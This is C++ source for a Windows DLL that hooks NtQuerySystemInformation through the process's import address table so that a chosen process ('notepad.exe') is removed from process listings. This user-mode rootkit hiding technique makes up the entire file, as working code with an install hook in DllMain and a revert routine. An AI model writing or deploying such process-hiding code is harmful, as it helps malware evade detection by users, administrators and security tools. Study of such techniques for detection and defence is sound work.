#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include "pch.h"
#include <winternl.h>
#include <string>


#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define HIDE_PROCNAME L"notepad.exe"


typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


NtQuerySystemInformation_t originalNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");



NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {

	NTSTATUS status = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status) {
		PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;

		while (pCurrent != NULL && pCurrent->NextEntryOffset != 0) {
			PSYSTEM_PROCESS_INFORMATION pNext = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			if (pNext->ImageName.Buffer != NULL && wcsncmp(pNext->ImageName.Buffer, HIDE_PROCNAME, pNext->ImageName.Length / sizeof(WCHAR)) == 0) {
				if (pNext->NextEntryOffset != 0) {
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				}
				else {
					pCurrent->NextEntryOffset = 0;
					break;
				}
			}
			else {
				pPrevious = pCurrent;
				pCurrent = pNext;
			}
		}
	}

	return status;
}



void HookIAT() {
	// Get the base address of the current process
	int* pBase = (int*)(GetModuleHandle(NULL));

	// Get the address of dos header
	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pBase;

	// Calculate the address of the NT header.
	IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)((DWORD_PTR)pBase + pDosHeader->e_lfanew);

	// Get the address of the Import Directory Table (IDT).
	IMAGE_IMPORT_DESCRIPTOR* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD_PTR)pBase + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	// Traverse through the IDT.
	while (pImportDesc->Name != 0) {
		char* dllName = (char*)((DWORD_PTR)pBase + pImportDesc->Name);
		HMODULE dll = LoadLibraryA(dllName);

		if (_stricmp(dllName, "ntdll.dll") == 0) {
			// Get the address of the THUNK data.
			IMAGE_THUNK_DATA* pILT = (IMAGE_THUNK_DATA*)((DWORD_PTR)pBase + pImportDesc->OriginalFirstThunk);
			IMAGE_THUNK_DATA* pThunk = (IMAGE_THUNK_DATA*)((DWORD_PTR)pBase + pImportDesc->FirstThunk);

			// Traverse through the import table to locate the MessageBox function
			while (pILT->u1.AddressOfData) {
				// Get the address of image import by name
				IMAGE_IMPORT_BY_NAME* pImportImageByName = (IMAGE_IMPORT_BY_NAME*)((DWORD_PTR)pBase + pILT->u1.AddressOfData);

				// Check if the NtQuerySystemInformation is imported.
				if (strcmp(pImportImageByName->Name, "NtQuerySystemInformation") == 0) {
					// NtQuerySystemInformation found, patch the IAT entry to point to HookedNtQuerySystemInformation.

					// Store the old memory protection attributes for the IAT entry
					DWORD oldProtect;

					// Change the protection attributes of the IAT entry
					VirtualProtect(&pThunk->u1.Function, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);

					// Changing the address to my modified function
					pThunk->u1.Function = (DWORD_PTR)&HookedNtQuerySystemInformation;

					// Restores the original memory protection attributes for the IAT entry
					VirtualProtect(&pThunk->u1.Function, sizeof(DWORD_PTR), oldProtect, &oldProtect);
				}

				pILT++;
				pThunk++;
			}
		}

		pImportDesc++;
	}
}



NTSTATUS WINAPI RevertHook() {
	// Get the base address of the current process.
	int* pBase = (int*)(GetModuleHandle(NULL));

	// Get the address of the DOS header.
	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pBase;

	// Calculate the address of the NT header.
	IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)((DWORD_PTR)pBase + pDosHeader->e_lfanew);

	// Get the address of the Import Directory Table (IDT).
	IMAGE_IMPORT_DESCRIPTOR* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD_PTR)pBase + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	// Traverse through the IDT to find "ntdll.dll".
	while (pImportDesc->Name != 0) {
		char* dllName = (char*)((DWORD_PTR)pBase + pImportDesc->Name);

		if (_stricmp(dllName, "ntdll.dll") == 0) {
			// Get the address of the THUNK data for original and current thunks.
			IMAGE_THUNK_DATA* pOrigILT = (IMAGE_THUNK_DATA*)((DWORD_PTR)pBase + pImportDesc->OriginalFirstThunk);
			IMAGE_THUNK_DATA* pILT = (IMAGE_THUNK_DATA*)((DWORD_PTR)pBase + pImportDesc->FirstThunk);

			// Traverse the import table to locate the "NtQuerySystemInformation" function.
			while (pOrigILT->u1.AddressOfData != NULL) {
				IMAGE_IMPORT_BY_NAME* pImportByName = (IMAGE_IMPORT_BY_NAME*)((DWORD_PTR)pBase + pOrigILT->u1.AddressOfData);

				if (strcmp(pImportByName->Name, "NtQuerySystemInformation") == 0) {
					DWORD oldProtect;

					// Change memory protection to allow writing.
					VirtualProtect(&pILT->u1.Function, sizeof(DWORD_PTR), PAGE_EXECUTE_READWRITE, &oldProtect);

					// Restore the original function pointer.
					pILT->u1.Function = (DWORD_PTR)originalNtQuerySystemInformation;

					// Restore the original memory protection.
					VirtualProtect(&pILT->u1.Function, sizeof(DWORD_PTR), oldProtect, &oldProtect);

					break;
				}

				pOrigILT++;
				pILT++;
			}

			break;
		}

		pImportDesc++;
	}

	return STATUS_SUCCESS;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		HookIAT();
		break;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:

	case DLL_PROCESS_DETACH:
		if (ul_reason_for_call == NULL) {
			RevertHook();
		}
		break;
	}

	return TRUE;
}